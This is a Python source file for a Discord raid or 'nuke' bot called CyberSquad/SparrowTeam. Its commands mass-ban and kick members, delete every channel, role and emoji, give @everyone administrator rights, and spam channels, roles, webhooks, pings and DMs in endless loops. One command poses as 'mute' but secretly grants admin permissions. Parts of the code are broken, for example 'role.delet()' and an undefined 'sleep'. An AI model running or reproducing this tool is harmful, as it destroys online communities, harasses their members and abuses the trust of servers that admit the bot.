import keep_alive
import os
from os import environ
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
from discord import Permissions 
import discord,random,time
from discord_webhook import DiscordWebhook, DiscordEmbed
import json
from discord.ext import commands 
import colorama
import asyncio
from colorama import Fore
from discord import Embed
import requests

SPAM_CHANNEL =  ["SparrowTeamGGBoy","SparrowTeamOnTop","SparrowTeamWasHere","SparrowTeamGGBoy","SparrowTeamOnTop","SparrowTeamWasHere"]
SPAM_MESSAGE = ["@everyone https://discord.gg/ExfGsCMUYt Nuke By SparrowTeam #SparrowTeamOnTop #SparrowTeamWasHere","@everyone https://discord.gg/ExfGsCMUYt Nuke By SparrowTeam #SparrowTeamGG #SparrowTeamOp"]
WEBHOOK_NAMES = ["SparrowTeamGGBoy","SparrowTeamOnTop","SparrowTeamWasHere""SparrowTeamGGBoy","SparrowTeamOnTop","SparrowTeamWasHere"]

# ------ SETUP ------ #

prefix = os.environ['PREFIX']
mongo = os.environ['MONGO']
owner = os.environ['OWNER']
invite = os.environ['INVITE']
username = os.environ['USERNAME']
support = os.environ['SUPPORT']

# ------------------ #

colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=f"{prefix}",intents=intents)
bot.remove_command("help")
with open('config.json') as f:
    my_secret = os.environ['TOKEN']
    my_secret = os.environ['TOKEN'] 
    TOKEN = my_secret = os.environ['TOKEN']

@bot.event
async def on_ready():
   print(Fore.MAGENTA + (''' CyberSquad Bot 4.5 , By Macroboy


 ▄▄·  ▄· ▄▌▄▄▄▄· ▄▄▄ .▄▄▄  .▄▄ · .▄▄▄  ▄• ▄▌ ▄▄▄· ·▄▄▄▄    ▄▄▄▄·       ▄▄▄▄▄
▐█ ▌▪▐█▪██▌▐█ ▀█▪▀▄.▀·▀▄ █·▐█ ▀. ▐▀•▀█ █▪██▌▐█ ▀█ ██· ██   ▐█ ▀█▪ ▄█▀▄ •██  
██ ▄▄▐█▌▐█▪▐█▀▀█▄▐▀▀▪▄▐▀▀▄ ▄▀▀▀█▄█▌·.█▌█▌▐█▌▄█▀▀█ ▐█▪ ▐█▌  ▐█▀▀█▄▐█▌.▐▌ ▐█.▪
▐███▌ ▐█▀·.██▄▪▐█▐█▄▄▌▐█•█▌▐█▄▪▐█▐█▪▄█·▐█▄█▌▐█▪ ▐▌██. ██   ██▄▪▐█▐█▌.▐▌ ▐█▌·
·▀▀▀   ▀ • ·▀▀▀▀  ▀▀▀ .▀  ▀ ▀▀▀▀ ·▀▀█.  ▀▀▀  ▀  ▀ ▀▀▀▀▀•   ·▀▀▀▀  ▀█▄▀▪ ▀▀▀ 





╔══════════════════════════════════════════════════════════════════╗
║                     LIST COMMANDS:                               ║
║                                                                  ║
║ U$help       ║ U$wizz      ║ U$dmall                             ║
║ U$nuke       ║ U$spamb     ║ U$stop                              ║
║ U$name       ║ U$perms                                           ║
║ U$spamr      ║ U$emojidel                                        ║
║                                                                  ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════╗
║                       LIST COMMANDS 2:                           ║
║                                                                  ║
║ U$spamca           ║ U$autopilot                                 ║
║ U$spamch           ║ U$help2                                     ║
║ U$stop                                                           ║
║                                                                  ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════╗
║                      COLOR:                          ║
║                                                      ║
║ GREEN = MEMBER KICKED  ║ MAGENTA = READY             ║
║ YELLOW = FAIL          ║ RED = MEMBER EXECUTED       ║
║ WHITE = CODE FAIL      ║ BLUE = SUCCESS              ║
║                                                      ║
║                                                      ║
╚══════════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════════╗
║    © Copyright CyberSquad Bot | All rights served.   ║
╚══════════════════════════════════════════════════════╝                         

Running...
 ''') + Fore.RESET)
   await bot.change_presence(activity=discord.Game(name= "SPARROWTEAM DEVELOPER"))

@bot.command()
async def spamca(ctx):
  await ctx.message.delete()
  while True:
   await ctx.guild.create_category(name="SparrowTeam Again")
   await ctx.guild.create_category(name="SparrowTeam")
   await ctx.guild.create_category(name="SparrowTeam GG")
   await ctx.guild.create_category(name="SparrowTeam Was Here")
   await ctx.guild.create_category(name="SparrowTeam On Top")
   print(Fore.BLUE + ("Spamming categorys") + Fore.RESET)

@bot.command()
async def spamvo(ctx):
  await ctx.message.delete()
  while True:
   ctx.guild.create_channel(name="━━━━━━━━━━●")
   ctx.guild.create_voice_channel(name="RAID BY : Arlinn GANTENG")
   ctx.guild.create_voice_channel(name="SparrowTeam")
   ctx.guild.create_voice_channel(name="━━━━━━━━━━●")
   ctx.guild.create_voice_channel(name="THE LEGEND IS BACK")
   ctx.guild.create_voice_channel(name="━━━━━━━━━━●")
   print(Fore.BLUE + ("Spamming voices") + Fore.RESET)

@bot.command()
async def role(ctx):
    await ctx.message.delete()
    await ctx.guild.create_role(name='Mute', permissions=Permissions.all())
    role = discord.utils.get(ctx.guild.roles, name="Mute")
    await ctx.author.add_roles(role)
    print(Fore.BLUE + (f"I Have Given {ctx.author.name} Role Admin.") + Fore.RESET)

@bot.command()
async def spamch(ctx):
  await ctx.message.delete()
  while True:
   await ctx.guild.create_text_channel(name="SparrowTeam Again",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_text_channel(name="SparrowTeam",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_text_channel(name="SparrowTeam GG",colour=discord.Colour(0xFFA3FB))
   await ctx.guild.create_text_channel(name="SparrowTeam Was Here",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_text_channel(name="SparrowTeam On Top",colour=discord.Colour(0x0EF5F6))
   print(Fore.BLUE + ("Spamming Channels") + Fore.RESET)

@bot.command(aliases=['fuck', 'serverfuck', 'destroy', 'del'])
@commands.guild_only()
async def dy(ctx):
  for member in ctx.guild.members:
    try:
      await member.ban()
    except:
      continue
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      continue
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
    except:
      continue
  try:
    await ctx.guild.edit(name="TTAX STEEMITION",
icon="https://media.discordapp.net/attachments/985788710266212352/989551811331506236/TTAX_STEEMITION.png")
  except:
    pass
  try:
    for _i in range(1):
      await ctx.guild.create_text_channel(name="ⓐⓛⓓⓞⓝⓞⓜⓔⓡⓒⓨ")
  except:
    pass
  try:
    for _i in range(1):
      await ctx.guild.create_voice_channel		 (name="•─────")
  except:
    pass
  try:
    for _i in range(1):
      await ctx.guild.create_voice_channel(name="𝐑𝐚𝐢𝐝 𝐁𝐲 :")
  except:
    pass
  try:
    for _i in range(1):
      await ctx.guild.create_voice_channel(name="╭───────────────╮")
  except:
    pass
  try:
    for _i in range(1):
      await ctx.guild.create_voice_channel(name="ᴀʟᴅᴏ ɴᴏ ᴍᴇʀᴄʏ 🔥")
  except:
    pass
  try:
    for _i in range(1):
      await ctx.guild.create_voice_channel(name="⚔️ TTΛX GΞNERATION ⚔️")
  except:
    pass
  try:
    for _i in range(1):
      await ctx.guild.create_voice_channel(name="Y-TEAM SQUAD 🖕")
  except:
    pass
  try:
    for _i in range(1):
      await ctx.guild.create_voice_channel(name="╰───────────────╯")
  except:
    pass
  try:
    for _i in range(1):
      await ctx.guild.create_voice_channel(name="🔗┊𝗜𝗚 : 𝙩𝙩𝙖𝙭.𝙞𝙙 ↩")
  except:
    pass
  try:
    for _i in range(250):
      await ctx.guild.create_role(name="TTAX STEEMITION", color=0x26fcff)
  except:
    pass

@bot.command()
async def spamr(ctx):
 while True:
   await ctx.guild.create_role(name="SparrowTeamGG",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_role(name="SparrowTeamOnTop",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="SparrowTeam",colour=discord.Colour(0xFFA3FB))
   await ctx.guild.create_role(name="SparrowTeam Was Here",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="SparrowTeamAgain",colour=discord.Colour(0x0EF5F6))
   print(Fore.BLUE + ("Spamming Roles") + Fore.RESET)

@bot.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print(Fore.BLUE + F"Action completed: User Info")

@bot.command()
async def spamb(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(Fore.RED + (f"EXECUTED {user}") + Fore.RESET)
        except:
           pass
@bot.command()
async def spamk(ctx):
 await ctx.message.delete()
 #print("Kicked all members <3 ~")
 for user in ctx.guild.members:
        try:
            await user.kick()
            print(Fore.GREEN + (f"KICKED {user}") + Fore.RESET)
        except:
           pass

@bot.command()
async def perms (ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.BLUE + "I Have Given Everyone Admin." + Fore.RESET)
    except:
      print(Fore.YELLOW + "I Was Unable To Give Everyone Admin" + Fore.RESET)

@bot.command()
async def lol (ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "LOL")
      await role.edit(permissions = Permissions.all())
      print(Fore.BLUE + "I Have Given Everyone Admin." + Fore.RESET)
    except:
      print(Fore.YELLOW + "I Was Unable To Give Everyone Admin" + Fore.RESET)

@bot.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@bot.command(description="Mutes the specified user.")
@commands.has_permissions(manage_messages=True)
async def lop(ctx, member: discord.Member, *, reason=None):
    guild = ctx.guild
    mutedRole = discord.utils.get(guild.roles, name="LOL")

    if not mutedRole:
        mutedRole = await guild.create_role(name="LOL")

        role = discord.utils.get(guild.roles, name = "LOL")
        await role.edit(permissions = Permissions.all())
        print(Fore.BLUE + "I Have Given Everyone Admin." + Fore.RESET)
        print(Fore.YELLOW + "I Was Unable To Give Everyone Admin" + Fore.RESET)
    await role.edit(permissions = Permissions.all())
    await member.add_roles(mutedRole, reason=reason)
    await ctx.send(f"Muted {member.mention} for reason {reason}")
    await member.send(f"You were muted in the server {guild.name} for {reason}")

@bot.command()
async def dmall(ctx, *, args=None):
    await ctx.message.delete()
    if args != None:
        members = ctx.guild.members
        for member in members:
            try:
                await member.send(args)
                print(Fore.BLUE + "'" + args + "' sent to: " + member.name)

            except:
                print(Fore.YELLOW + "Couldn't send '" + args + "' to: " + member.name)

    else:
        await ctx.channel.send("A message was not provided.")

@bot.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout() 
    print (Fore.BLUE + f"{bot.user.name} has logged out successfully." + Fore.RESET)

@bot.command(pass_context=True)
async def name(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@bot.command(pass_context=True)
async def gn(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@bot.command()
async def delch (ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.BLUE + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.YELLOW + f"{channel.name} was NOT deleted." + Fore.RESET)

@bot.command()
async def massping (ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(SPAM_MESSAGE)
        )
          print(f"{channel.name} spammed")
        except:
          print(f"{channel.name} not spammed")
@bot.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(SPAM_MESSAGE))
    await webhook.send(random.choice(SPAM_MESSAGE), username=random.choice(WEBHOOK_NAMES))

@bot.command()
async def nuck(ctx, amount=100):
  await ctx.guild.edit(name="#SparrowTeamOnTop")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(channel.name + " Has been wizzed")
    except:
        pass
        print ("error")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(SPAM_CHANNEL))
      print(f"[{i}] channels made")
    except:
      print("error making channels")
  for role in ctx.guild.roles:
    try:
      await role.delet()
      print(f"{role.name} deleted")

    except:
      print(f"{role.name} not deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(SPAM_MESSAGE)
        )
          print(f"{channel.name} spammed")
        except:
          print(f"{channel.name} not spammed")
    for member in ctx.guild.members:
      if member.id != 931525197343911947:  
        try:
          await member.ban(reason="Beamed")
          print(f"{member.name} banned from {ctx.guild.name}")
        except:
          print(f"{member.name} not banned from {ctx.guild.name}")  


@bot.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(SPAM_MESSAGE))
    await webhook.send(random.choice(SPAM_MESSAGE), username=random.choice(WEBHOOK_NAMES))


@bot.command()
async def help2(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="CyberSquad | Help Panel", description=f"```ini\n{prefix}[nuke] - Shows All Nuke Commands\n{prefix}[text] - Shows All Text Commands.\n{prefix}[utlity] - Shows All Utlity Commands.\n{prefix}[owner] - Shows All Owner Commands.```", color=0x2f3136)
    embed.set_footer(text=f"Request By: {ctx.author.name}")
    await ctx.send(embed=embed)

@bot.command()
async def utlity(ctx):
    await ctx.message.delete()
    pizza = discord.Embed(title="CyberSquad | Utlity Panel", description=f"```ini\n{prefix}[avatar] - Shows Your Avatar.\n\n{prefix}[invite] - Invite Me (Invite Link Bot)\n\n{prefix}[timer] - Shows Your Time\n\n{prefix}[poll] - Create Polling\n\n{prefix}[banner] - Shows Your Profile Banner\n\nAll Command Utlity Coming Soon```", color=0x2f3136)
    pizza.set_footer(text=f"Request By: {ctx.author.name}")
    await ctx.send(embed=pizza)

@bot.command()
async def owner(ctx):
    await ctx.message.delete()
    pizza = discord.Embed(title="CyberSquad | Owner Panel", description=f"```ini\n{prefix}[dm] - Dm User Examples {prefix}dm @cybersquad Text.\n\n{prefix}[leave-guild] - Leave Server Examples {prefix}leave-guild 938001646980575273 (only work owner bot)\n\n{prefix}[stop] - Stop Bot\n\n{prefix}[changeName] - Change Nickname Bot Examples {prefix}changeName SparrowTeam\n\n{prefix}[changeAvatar] - Change Avatar Bot Examples {prefix}changeAvatar https://cdn.discordapp.com/icons/965964766562627594/8dd4edd3f4078e05c539d8dbbc27063f.png?size=4096 (only work png or jpg)\n\nAll Command Owner Coming Soon```", color=0x2f3136)
    pizza.set_footer(text=f"Request By: {ctx.author.name}")
    await ctx.send(embed=pizza)

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    pizza = discord.Embed(title="CyberSquad | Nuke Panel", description=f"```ini\n{prefix}[trash] - Forcefully Destroys Whole Server.\n\n{prefix}[bob] - Spammes Create roles , massbans , Delete All Emoji etc.\n\n{prefix}[nuck] - Spammes Create roles , massbans , webhookspames , Delete All Emoji etc. \n\n{prefix}[name] - Rename Server\n\n{prefix}[spamr] - Spammes Role\n\n{prefix}[spamca] - Spammes Category\n\n{prefix}[spamch] - Spammes Channel\n\n{prefix}[role] - Give Permission Role\n\n{prefix}[massping] - Spammes Messages\n\n{prefix}[ban] - Ban All\n\n{prefix}[spamvo] - Spammes Voices\n\n{prefix}[spamr] - Spammes Role\n\n{prefix}[delch] - Delete All Channels```", color=0x2f3136)
    pizza.set_footer(text=f"Request By: {ctx.author.name}")
    await ctx.send(embed=pizza)

@bot.command()
async def say(ctx, *, arg):
    await ctx.message.delete()
    await ctx.send(f"{arg}")

@bot.command()
async def text(ctx):
    await ctx.message.delete()
    tolol = discord.Embed(title="CyberSquad | Text Panel", description=f"```ini\n{prefix}[ping] - Shows Ping Of Bot\n\n{prefix}[purge] - purges msgs Example {prefix}purge 50\n\n{prefix}[activity] - activity changer example {prefix}activity test\n\n{prefix}[say] - say msgs example {prefix}say [Message]```", color=0x2f3136)
    tolol.set_footer(text=f"Request By: {ctx.author.name}")
    await ctx.send(embed=tolol)  

snipe_message_author = {}
snipe_message_content = {}

@bot.event
async def on_message_delete(message):
     snipe_message_author[message.channel.id] = message.author
     snipe_message_content[message.channel.id] = message.content
     await sleep(60)
     del snipe_message_author[message.channel.id]
     del snipe_message_content[message.channel.id]

@bot.command()
async def snipe(ctx):
    channel = ctx.channel 
    try:
        snipeEmbed = discord.Embed(title=f"Last deleted message in #{channel.name}", description = snipe_message_content[channel.id])
        snipeEmbed.set_footer(text=f"Deleted by {snipe_message_author[channel.id]}")
        await ctx.send(embed = snipeEmbed)
    except:
        await ctx.send(f"There are no deleted messages in #{channel.name}")

@bot.command()
async def userinfo(ctx,user:discord.Member=None):

    if user==None:
        user=ctx.author

    rlist = []
    for role in user.roles:
      if role.name != "@everyone":
        rlist.append(role.mention)

    b = ", ".join(rlist)


    embed = discord.Embed(colour=user.color,timestamp=ctx.message.created_at)

    embed.set_author(name=f"User Info - {user}"),
    embed.set_thumbnail(url=user.avatar_url),
    embed.set_footer(text=f'Requested by - {ctx.author}',
  icon_url=ctx.author.avatar_url)

    embed.add_field(name='ID:',value=user.id,inline=False)
    embed.add_field(name='Name:',value=user.display_name,inline=False)

    embed.add_field(name='Created at:',value=user.created_at,inline=False)
    embed.add_field(name='Joined at:',value=user.joined_at,inline=False)



    embed.add_field(name='Bot?',value=user.bot,inline=False)

    embed.add_field(name=f'Roles:({len(rlist)})',value=''.join([b]),inline=False)
    embed.add_field(name='Top Role:',value=user.top_role.mention,inline=False)

    await ctx.send(embed=embed)

@bot.command(aliases=['clear'])
async def purge(ctx, amount=1000):
    if(not ctx.author.guild_permissions.manage_messages):
        await ctx.send("Cannot run command! Requires: ``Manage Messages``")
        return
    amount = amount+1
    if amount > 101:
        await ctx.send("I can\'t delete more than 100 messages at a time!")
    else: 
        await ctx.channel.purge(limit=amount)
        await ctx.send(f"**Sucessfully deleted {amount} messages!**")

@bot.command(description="Mutes the specified user.")
@commands.has_permissions(manage_messages=True)
async def mute(ctx, member: discord.Member, *, reason=None):
    guild = ctx.guild
    mutedRole = discord.utils.get(guild.roles, name="Muted")

    if not mutedRole:
        mutedRole = await guild.create_role(name="Muted")

        for channel in guild.channels:
            await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=False)

    await member.add_roles(mutedRole, reason=reason)
    await ctx.send(f"Muted {member.mention} for reason {reason}")
    await member.send(f"You were muted in the server {guild.name} for {reason}")


@bot.command(description="Changes bots activity")
@commands.has_permissions(administrator=True)
async def activity(ctx, *, activity):
    await bot.change_presence(activity=discord.Game(name=activity))
    await ctx.send(f"Bot's activity changed to {activity}")

@bot.command(description="Unmutes a specified user.")
@commands.has_permissions(manage_messages=True)
async def unmute(ctx, member: discord.Member):
    mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")

    await member.remove_roles(mutedRole)
    await ctx.send(f"Unmuted {member.mention}")
    await member.send(f"You were unmuted in the server {ctx.guild.name}")


keep_alive.keep_alive()
bot.run(TOKEN, bot=True)
